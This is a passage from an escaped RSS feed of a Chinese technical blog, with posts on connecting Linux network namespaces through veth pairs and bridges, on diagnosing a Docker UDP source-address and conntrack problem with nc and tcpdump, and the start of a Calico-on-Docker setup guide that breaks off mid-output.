&lt;p&gt;每个新创建的 network namespace 默认有一个本地环回接口 lo，并且这个接口是处于关闭状态的。下面我们就启动这个接口：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63324996-d6852100-c35b-11e9-981f-d95726142cec.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;启动 lo 接口后我们可以看到其 IP 地址，并且能够 ping 通。&lt;/p&gt;

&lt;h3 id=&quot;在两个-network-namespace-之间通信&quot;&gt;在两个 network namespace 之间通信&lt;/h3&gt;

&lt;p&gt;network namespace 之间是相互隔离的，我们可以使用 veth 设备把两个 network namespace 连接起来进行通信。veth 设备是虚拟的以太网设备。它们可以充当 network namespace 之间的通道，也可以作为独立的网络设备使用。&lt;strong&gt;veth 设备总是被成对的创建，并且这一对设备总是连接在一起的，所以一般称之为 veth pair。&lt;/strong&gt;需要注意的是，veth pair 无法单独存在，删除其中一个，另一个也会自动消失。接下来的示例我们就演示如何使用 veth pair 在两个 network namespace 直接通信。示例中我们使用 ip link 命令来创建和管理 veth pair。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第一步，先创建两个 network namespace net0 和 net1&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip netns add net0
ip netns add net1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;第二步，创建一对命名的 veth 设备&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;默认情况下会自动为 veth pair 生成名称，这里为了易于辨识，我们在创建时指定 veth pair 的名称：&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add vethmother &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name vethfather
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63325674-34fecf00-c35d-11e9-8a1e-09443031db75.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如图所示，veth pair 在主机上表现为两个网卡。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第三步，把这一对 veth pair 分别放到 network namespace net0 和 net1中&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;vethmother netns net0
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;vethfather netns net1
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip addr
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net1 ip addr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63325799-71322f80-c35d-11e9-9403-4b6ab5d95c77.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;查看 net0 和 net1 中的网络资源，发现各自多了一个网卡，也就是 veth 设备的两个端点。注意，当我们把 veth pair 分配到 network namespace 中后，在主机上就看不到它们了。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第四步，给这些 veth pair 分配 IP 并启用它们&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;vethmother up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip addr add 10.0.1.1/24 dev vethmother
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip route
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net1 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;vethfather up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net1 ip addr add 10.0.1.2/24 dev vethfather
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net1 ip route
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;下面通过 ping 命令来验证两个 network namespace 是否可以通信：&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 3 10.0.1.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63326000-e998f080-c35d-11e9-816b-03b39bff47b2.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;至此，我们构建了一个如下结构的虚拟网络：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63326036-f9b0d000-c35d-11e9-9b76-2670ab5c18f2.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;通过-bridge-连接-network-namespace&quot;&gt;通过 bridge 连接 network namespace&lt;/h3&gt;

&lt;p&gt;虽然 veth pair 可以实现两个 network namespace 之间的通信，但是当需要在多个 network namespace 之间通信的时候，光靠 veth pair 就不行了。我们可以使用 Linux 提供的虚拟交换机，来完成这样的功能。下面的示例演示如何通过虚拟交换机(这里就是一个虚拟网桥)连接多个 network namespace。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第一步，先添加一个叫 mybridge0 的网桥&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add mybridge0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;bridge
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev mybridge0 up
ip addr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对主机来说其实就是新添加了一个网络接口。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;第二步，创建 network namespace 和 veth 设备&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip netns add net0
ip &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;add veth0 &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;veth peer name veth0p 

ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev veth0p netns net0
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev veth0p name eth0
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip addr add 10.0.1.1/24 dev eth0
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev eth0 up
ip netns &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;net0 ip addr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63326429-cfabdd80-c35e-11e9-90a8-a41327b7c57a.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图显示 network namespace net0 中的 eth0 网卡已经启动了。下面把 veth 设备的另一端连接到网桥 mybridge0 上：&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev veth0 master mybridge0
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev veth0 up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;第三步，重复第二步创建 net1 和 net2，并连接到网桥&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;给 mybridge0 设置 IP：&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev mybridge0 down
ip addr add 10.0.1.254/24 dev mybridge0
ip &lt;span class=&quot;nb&quot;&gt;link set &lt;/span&gt;dev mybridge0 up
ip addr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过 bridge link 命令查看网桥的信息如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63326917-c8390400-c35f-11e9-8b5c-3700bab628b5.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这时就可以在不同的 network namespace 之间通信了：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63329053-d38e2e80-c363-11e9-9ef5-02199d26cd5a.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们创建的网络拓扑结构如下所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/63327204-57461c00-c360-11e9-8340-7d948ff3d0d8.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;

&lt;p&gt;通过 network namespace 可以创建相互独立的网络栈，从而实现网络的隔离。其中 network namespace 之间通过 bridge 通信的方式已经与 docker 网络的 bridge 模式非常类似了，剩下的不过就是开启ip.forward，添加NAT规则等等。&lt;/p&gt;
</description>
        <pubDate>Tue, 20 Aug 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-08-20/Linux-namespace/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-08-20/Linux-namespace/</guid>
        
        <category>容器</category>
        
        
        <category>Linux</category>
        
      </item>
    
      <item>
        <title>深入理解UDP</title>
        <description>&lt;p&gt;最近在工作中遇到一个 docker 容器下 UDP 协议网络不通的问题，困扰了很久，也比较有意思，某一天等红绿灯的时候突然茅塞顿开，所以再此记录一下。&lt;/p&gt;

&lt;p&gt;我们有个应用是 UDP 协议的，部署上去发现无法工作，但是换成 TCP 协议是可以的（应用同时支持 UDP、TCP 协议，切换成 TCP 模式发现一切正常）。虽然换成 TCP 能解决问题，但是我们还是想知道到底 UDP 协议为什么会出现这个问题，以防止后面其他 UDP 应用会有异常。&lt;/p&gt;

&lt;p&gt;这个问题抽象出来是这样的：如果有 UDP 服务运行在主机上，并且监听在 0.0.0.0 地址（也就是所有的 ip 地址），从运行在 docker bridge 网络的容器运行客户端访问服务，两者通信有问题。&lt;/p&gt;

&lt;p&gt;注意以上的的限制条件，通过测试，我们发现下来几种情况都是正常的：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;使用 TCP 协议没有这个问题，这个已经说过了&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;如果 UDP 服务器监听在 eth0 IP 地址上也不会出现这个问题&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;并不是所有的应用都有这个问题，我们的 DNS（dnsmasq + kubeDNS） 也是同样的部署方式，但是功能都正常&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个问题在 docker 上也有 issue 记录：&lt;a href=&quot;https://github.com/moby/moby/issues/15127&quot;&gt;https://github.com/moby/moby/issues/15127&lt;/a&gt; ，但是目前并没有很好的解决方案。&lt;/p&gt;

&lt;p&gt;这篇文章就分析一下出现这个问题的原因。&lt;/p&gt;

&lt;h2 id=&quot;问题重现&quot;&gt;问题重现&lt;/h2&gt;

&lt;p&gt;这个问题很容易重现，我的实验是在 red hat7.5 下用 &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat&lt;/code&gt; 命令完成的，其他系统应该类似。在主机上通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; 监听 5678 端口，然后在容器里使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; 发数据。第一个报文是能发送出去的，但是以后的报文虽然在网络上能看到，但是对方无法接收。&lt;/p&gt;

&lt;p&gt;在主机上运行 nc UDP 服务器&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;# nc -ul 5678&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;然后随便启动一个容器，运行客户端&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/ # nc -u 192.168.106.242 5678&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;nc 的通信是双方的，不管对方输入什么字符，回车后对方就能立即收到。但是在这个模式下，客户端第一次输入对方能够收到，后续的报文对方都收不到。&lt;/p&gt;

&lt;p&gt;在这个实验中，容器使用的是 docker 的默认网络，容器的 ip 是 172.17.0.2，通过 veth pair（图中没有显示）连接到虚拟网桥 docker0（ip 地址为 172.17.0.1），主机本身的网络为 eth0，其 ip 地址为 192.168.106.242&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 172.17.0.2
+----------+
 |   eth0   |
+----+-----+
     |
     |
     |
     |
+----+-----+          +----------+
 | docker0  |           |  eth0    |
+----------+          +----------+
172.17.0.1            192.168.106.242
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;tcpdump-抓包&quot;&gt;tcpdump 抓包&lt;/h2&gt;

&lt;p&gt;遇到这种疑难杂症，第一个想到的抓包，我们需要在 docker0 上抓包，因为这是报文必经过的地方。通过过滤容器的 ip 地址，很容易找到感兴趣的报文：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;# tcpdump -i docker0 -n host 172.17.0.2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;为了模拟多数应用一问一答的通信方式，我们一共发送三个报文，并用 tcpdump 抓取 docker0 接口上的报文：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;客户端先向服务器端发送 hello&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;服务器端回复 world&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;客户端继续发送 hi 消息&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;抓包的结果如下，可以发现第一个报文发送出去没有任何问题（因为 UDP 是没有 ACK 报文的，所以客户端无法知道对方有没有收到，这里说的没有问题是指没有对应的 ICMP 报文），但是第二个报文从服务端发送的报文，对方会返回一个 ICMP 告诉端口 44182 不可达；第三个报文从客户端发送的报文也是如此。以后的报文情况类似，双方再也无法进行通信了。&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump: verbose output suppressed, use &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; or &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;full protocol decode
listening on docker0, link-type EN10MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, capture size 262144 bytes
14:48:42.514345 IP 172.17.0.2.44182 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.106.242.rrac: UDP, length 6
14:48:47.523098 ARP, Request who-has 172.17.0.1 tell 172.17.0.2, length 28
14:48:47.523144 ARP, Reply 172.17.0.1 is-at 02:42:0c:b4:3f:ee, length 28
14:48:52.325946 IP 172.17.0.1.rrac &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 172.17.0.2.44182: UDP, length 6
14:48:52.325994 IP 172.17.0.2 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 172.17.0.1: ICMP 172.17.0.2 udp port 44182 unreachable, length 42
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;问题原因&quot;&gt;问题原因&lt;/h2&gt;

&lt;p&gt;从网络报文的分析中可以看到服务端返回的报文源地址不是我们预想的 eth0 地址，而是 docker0 的地址，而客户端直接认为该报文是非法的，返回了 ICMP 的报文给对方。&lt;/p&gt;

&lt;p&gt;那么问题的原因也可以分为两个部分：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;为什么应答报文源地址是错误的？&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;既然 UDP 是无状态的，内核怎么判断源地址不正确呢？&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;主机多网络接口-udp-源地址选择问题&quot;&gt;主机多网络接口 UDP 源地址选择问题&lt;/h2&gt;

&lt;p&gt;第一个问题的关键词是：UDP 和多网络接口。因为如果主机上只有一个网络接口，发出去的报文源地址一定不会有错；而我们也测试过 TCP 协议是能够处理这个问题的。&lt;/p&gt;

&lt;p&gt;通过搜索，发现这确实是个已知的问题。在 «TCP/IP详解» 这本书中，已经描述过这个问题，下面是对应的内容：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;这个问题可以归结为一句话：UDP 在多网卡的情况下，可能会发生服务器端源地址不对的情况，这是内核选路的结果。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;为什么 UDP 和 TCP 有不同的选路逻辑呢？因为 UDP 是无状态的协议，内核不会保存连接双方的信息，因此每次发送的报文都认为是独立的，socket 层每次发送报文默认情况不会指明要使用的源地址，只是说明对方地址。因此，内核会为要发出去的报文选择一个 ip，这通常都是报文路由要经过的设备 ip 地址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;del&gt;既然这样，聪明的你可能要问为什么 dnsmasq 服务没有这个问题呢？这个就涉及到 socket 系统调用问题了，我也不会&lt;/del&gt;&lt;/p&gt;

&lt;h2 id=&quot;关于-udp-连接的疑惑&quot;&gt;关于 UDP 连接的疑惑&lt;/h2&gt;

&lt;p&gt;第二个问题是：为什么内核会把源地址和之前不同的报文丢弃？认为它是非法的？因为我们前面已经说过，UDP 协议是无连接的，默认情况下 socket 也不会保存双方连接的信息。即使服务端发送报文的源地址有误，只要对方能正常接收并处理，也不会导致网络不通。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;那是因为 conntrack，内核的 netfilter 模块会保存连接的状态(也就是俗称的 iptables )，并作为防火墙设置的依据。其实和状态防火墙一个道理，它保存的 UDP 连接，只是简单记录了主机上本地 ip 和端口，和对端 ip 和端口，并不会保存更多的内容。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;解决方案&quot;&gt;解决方案&lt;/h2&gt;

&lt;p&gt;知道了问题的原因，解决方案也就很容易找到。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;使用 TCP 协议：如果服务端和客户端使用 TCP 协议进行通信，它们之间的网络是正常的。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;监听在特定网卡：&lt;code class=&quot;highlighter-rouge&quot;&gt;# nc -ul 192.168.106.242 5678&lt;/code&gt;
这种情况下，服务端和客户端也能正常通信。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;del&gt;改动应用程序实现&lt;/del&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;
</description>
        <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-07-17/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3UDP/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-07-17/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3UDP/</guid>
        
        <category>容器</category>
        
        
        <category>网络</category>
        
      </item>
    
      <item>
        <title>Docker部署Calico网络</title>
        <description>&lt;p&gt;　　今天交流了NSX-T和K8S的集成，赶紧了解了一下原生开源的Calico网络。&lt;/p&gt;

&lt;p&gt;　　Calico是一个纯三层的虚拟网络方案，Calico为每个容器分配一个IP，每个host都是router，host之间采用了BGP协议发布路由，把不同host的容器连接起来。与VxLAN不同的是，Calico不对数据包做额外封装，不需要NAT和端口映射，扩展性和性能都很好。&lt;/p&gt;

&lt;h2 id=&quot;实验环境&quot;&gt;实验环境&lt;/h2&gt;

&lt;p&gt;Calico依赖etcd在不同主机间共享和交换信息，存储Calico网络状态。我们将在host 192.168.33.10上运行etcd。&lt;/p&gt;

&lt;p&gt;Calico网络中的每个主机都需要运行Calico组件，提供容器interface管理、动态路由、动态ACL、报告状态等功能。&lt;/p&gt;

&lt;p&gt;将就了之前搭的vagrant，实验环境如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/59015243-1f572e80-8871-11e9-9c7b-e5493bb6cb16.jpg&quot; alt=&quot;calico1&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;首先安装etcd&quot;&gt;首先安装etcd&lt;/h2&gt;

&lt;p&gt;在192.168.33.10主机上安装etcd:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;yum install -y etcd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;修改etcd配置文件：&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@master etc]# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/etcd/etcd.conf 
&lt;span class=&quot;c&quot;&gt;#[Member]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#ETCD_CORS=&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ETCD_DATA_DIR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/lib/etcd/default.etcd&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#ETCD_WAL_DIR=&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#ETCD_LISTEN_PEER_URLS=&quot;http://localhost:2380&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ETCD_LISTEN_CLIENT_URLS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.33.10:2379&quot;&lt;/span&gt;
...
&lt;span class=&quot;c&quot;&gt;#[Clustering]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#ETCD_INITIAL_ADVERTISE_PEER_URLS=&quot;http://localhost:2380&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ETCD_ADVERTISE_CLIENT_URLS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.33.10:2379&quot;&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;启动etcd服务&lt;code class=&quot;highlighter-rouge&quot;&gt;systemctl start etcd &amp;amp;&amp;amp; systemctl enable etcd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;修改docker配置文件连接etcd:&lt;/p&gt;

&lt;p&gt;修改 node1 和 node2 的 Docker daemon 配置文件/etc/docker/daemon.json&lt;/p&gt;

&lt;p&gt;连接 etcd：–cluster-store=etcd://192.168.33.10:2379&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/docker/daemon.json 
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;registry-mirrors&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://x3h8v36l.mirror.aliyuncs.com&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;cluster-store&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;etcd://192.168.33.10:2379&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;重启 Docker daemon&lt;code class=&quot;highlighter-rouge&quot;&gt; systemctl daemon-reload &amp;amp;&amp;amp; systemctl restart docker.service&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;部署calicoctl&quot;&gt;部署calicoctl&lt;/h2&gt;

&lt;p&gt;官方参考文档： https://docs.projectcalico.org/v2.6/getting-started/docker/installation/manual&lt;/p&gt;

&lt;p&gt;在node1和node2上下载calicoctl并运行calico容器:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# wget &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /usr/local/bin/calicoctl https://github.com/projectcalico/calicoctl/releases/download/v1.6.5/calicoctl
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /usr/local/bin/calicoctl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;创建calico配置文件:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /etc/calico/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# vim /etc/calico/calicoctl.cfg
apiVersion: v1
kind: calicoApiConfig
metadata:
spec:
  datastoreType: &lt;span class=&quot;s2&quot;&gt;&quot;etcdv2&quot;&lt;/span&gt;
  etcdEndpoints: &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.33.10:2379&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;分别在两个节点上创建calico容器，执行后会自动下载calico镜像并运行容器:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@node1 ~]# calicoctl node run &lt;span class=&quot;nt&quot;&gt;--node-image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;quay.io/calico/node:v2.6.12 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/calico/calicoctl.cfg
Running &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to load modules: modprobe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; xt_set ip6_tables
Enabling IPv4 forwarding
Enabling IPv6 forwarding
Increasing conntrack limit
Removing old calico-node container &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;running&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Running the following &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to start calico-node:

